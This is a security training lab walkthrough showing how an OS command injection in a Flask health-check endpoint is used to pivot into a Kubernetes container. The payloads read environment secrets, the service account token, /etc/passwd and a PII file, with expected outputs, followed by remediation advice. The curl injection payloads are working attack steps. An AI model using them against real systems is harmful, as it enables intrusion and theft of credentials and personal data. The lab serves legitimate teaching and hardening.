# Lab 06: Code to Container Pivot

> **Pivot**: Application Code -> Container Runtime | **Difficulty**: Intermediate | **Duration**: 30 min

## Objective

Demonstrate how a command injection vulnerability in the application layer can be leveraged to break out of the application context and access the underlying container environment. Starting from the OS command injection discovered in Lab 01, you will extract sensitive environment variables, read the container filesystem, steal Kubernetes service account tokens, and exfiltrate PII data -- all without ever directly accessing the container.

## OWASP Mapping

- **A03:2021 - Injection**: OS command injection via unsanitized health check parameter
- **A01:2021 - Broken Access Control**: Application process runs with excessive filesystem permissions
- **A05:2021 - Security Misconfiguration**: Secrets stored in environment variables, container runs as root

## GCC Compliance Impact

| Framework | Control | Description |
|-----------|---------|-------------|
| CIS GKE Benchmark | 5.2.6 | Minimize the admission of root containers |
| CIS GKE Benchmark | 5.2.7 | Minimize the admission of containers with added capabilities |
| NIST SP 800-190 | 4.1.2 | Image vulnerabilities and misconfigurations |
| PCI DSS 4.0 | 6.2.4 | Software engineering techniques to prevent injection attacks |
| SOC 2 | CC6.1 | Logical and physical access controls |
| ISO 27001 | A.8.24 | Use of cryptography (secrets in cleartext) |

## Prerequisites

- Completed Lab 01 (OS Command Injection confirmed)
- Access to the vulnerable Flask application at `http://NODE_IP:30080`
- Web browser or `curl` installed on your workstation
- Understanding of Linux command-line basics

## Attack Steps

### Step 1: Establish Command Execution via Injection

Use the command injection vulnerability from Lab 01 to confirm arbitrary command execution through the health check endpoint.

**Command:**

```bash
curl -s "http://NODE_IP:30080/health?check=basic';whoami;echo'"
```

**Expected Output:**

```text
{
  "status": "healthy",
  "checks": {
    "basic": "ok"
  }
}
root
```

The `whoami` output reveals that the Flask application process runs as `root` inside the container. This is a critical misconfiguration -- the container has no user namespace isolation, meaning any command injection executes with the highest privilege level available within the container.

### Step 2: Extract Container Environment Variables

Environment variables frequently contain secrets that developers inject at deployment time. Dump all environment variables from the container process.

**Command:**

```bash
curl -s "http://NODE_IP:30080/health?check=basic';env;echo'"
```

**Expected Output:**

```text
SECRET_KEY=supersecret-key-change-in-prod
ADMIN_PASSWORD=GCPAdmin@2024!Secure
DATABASE_URL=postgresql://admin:dbpass123@db-service:5432/aigovdb
AI_SERVICE_URL=http://ai-service:8081
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_SERVICE_PORT=443
GOOGLE_CLOUD_PROJECT=your-project-id
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=vuln-app-xxxxxxxx-xxxxx
```

This single command reveals the entire secret surface of the application: the Flask `SECRET_KEY` (used for session signing), the admin password in cleartext, database connection credentials including username and password, the internal AI service URL, and the Kubernetes API server address. None of these secrets are encrypted or managed through a proper secrets management solution.

### Step 3: Enumerate the Application Filesystem

Map out the container filesystem to understand the application structure and identify additional sensitive files.

**Command:**

```bash
curl -s "http://NODE_IP:30080/health?check=basic';ls%20-la%20/app;echo'"
```

**Expected Output:**

```text
total 48
drwxr-xr-x 1 root root 4096 Jan 15 10:00 .
drwxr-xr-x 1 root root 4096 Jan 15 10:00 ..
-rw-r--r-- 1 root root 5240 Jan 15 10:00 app.py
drwxr-xr-x 2 root root 4096 Jan 15 10:00 data
-rw-r--r-- 1 root root  512 Jan 15 10:00 requirements.txt
drwxr-xr-x 2 root root 4096 Jan 15 10:00 templates
drwxr-xr-x 2 root root 4096 Jan 15 10:00 static
```

The listing shows the application source code, a `data/` directory likely containing sensitive datasets, and the full application structure. Because the container runs as root and there are no read-only filesystem restrictions, every file is readable and writable.

### Step 4: Steal the Kubernetes Service Account Token

Every pod in Kubernetes has a service account token automatically mounted at a well-known path. Extract this token to pivot into the Kubernetes API.

**Command:**

```bash
curl -s "http://NODE_IP:30080/health?check=basic';cat%20/var/run/secrets/kubernetes.io/serviceaccount/token;echo'"
```

**Expected Output:**

```text
eyJhbGciOiJSUzI1NiIsImtpZCI6Inh4eCJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJhaS1nb3Zlcm5hbmNlIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6InZ1bG4tYXBwLXNhLXRva2VuIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InZ1bG4tYXBwLXNhIn0.SIGNATURE
```

This is a valid JWT token for the `vuln-app-sa` service account. Because this service account has been bound to a `cluster-admin` ClusterRole, this token grants unrestricted access to the entire Kubernetes cluster. The token can be used externally with `kubectl` or `curl` to interact with the Kubernetes API server.

### Step 5: Exfiltrate PII Data

Access the PII dataset stored in the container filesystem.

**Command:**

```bash
curl -s "http://NODE_IP:30080/health?check=basic';cat%20/app/data/sample_pii.json;echo'"
```

**Expected Output:**

```text
[
  {
    "customer_id": "CUST-001",
    "name": "Ahmad Al-Rashid",
    "national_id": "1087654321",
    "iban": "SA0380000000608010167519",
    "email": "ahmad@example.com",
    "risk_score": 0.75
  },
  {
    "customer_id": "CUST-002",
    "name": "Fatima Al-Saud",
    "national_id": "1198765432",
    "iban": "SA4420000001234567891234",
    "email": "fatima@example.com",
    "risk_score": 0.45
  }
]
```

The PII data -- including national IDs, IBANs, and personal information -- is stored in plaintext on the container filesystem without any encryption at rest. A single command injection exfiltrates the entire dataset.

### Step 6: Check Running Processes and Users

Enumerate the runtime context to understand what else is running in the container and what user context is available.

**Command:**

```bash
curl -s "http://NODE_IP:30080/health?check=basic';ps%20aux;echo'"
```

**Expected Output:**

```text
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.2  1.5 123456 15000 ?        Ss   10:00   0:05 python /app/app.py
root        50  0.0  0.0   2388   764 ?        S    10:01   0:00 ps aux
```

**Command:**

```bash
curl -s "http://NODE_IP:30080/health?check=basic';id;cat%20/etc/passwd|head%20-5;echo'"
```

**Expected Output:**

```text
uid=0(root) gid=0(root) groups=0(root)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

The Flask application is the only process running in the container, and it runs as PID 1 with root privileges. There is no process isolation, no security context constraints, and no read-only root filesystem. This confirms that the container was deployed with `runAsUser: 0` (root) and no `securityContext` restrictions.

## Remediation

1. **Input Validation and Sanitization**: Replace `os.system()` and `subprocess.shell=True` calls with parameterized alternatives. Use allowlists for the health check parameter.

2. **Non-Root Container Execution**: Set `runAsNonRoot: true` and `runAsUser: 1000` in the pod security context. Use `readOnlyRootFilesystem: true`.

3. **Secret Management**: Move all secrets from environment variables to a dedicated secret manager (GCP Secret Manager or HashiCorp Vault). Never embed credentials in environment variables.

4. **Disable Service Account Token Automounting**: Set `automountServiceAccountToken: false` on pods that do not need Kubernetes API access.

5. **Remove Sensitive Data from Container Images**: PII data must not be bundled into container images. Use encrypted external storage with access controls.

6. **Drop All Capabilities**: Set `allowPrivilegeEscalation: false` and `capabilities: { drop: ["ALL"] }` in the security context.

7. **Apply Pod Security Standards**: Enforce the `restricted` Pod Security Standard at the namespace level to prevent root containers and privileged configurations.

## Key Takeaways

- A single command injection vulnerability in the application layer provides full access to the container runtime environment, including secrets, filesystem, and Kubernetes credentials.
- Running containers as root eliminates all container-level isolation boundaries, making the pivot from application to container trivial.
- Environment variables are not a secure mechanism for storing secrets -- they are visible to any process in the container and trivially extractable through injection attacks.
- Automatically mounted Kubernetes service account tokens provide a direct bridge from container compromise to cluster-level access, especially when over-privileged service accounts are used.
- Defense in depth requires controls at every layer: input validation at the code layer, least-privilege and immutability at the container layer, and minimal RBAC at the cluster layer.
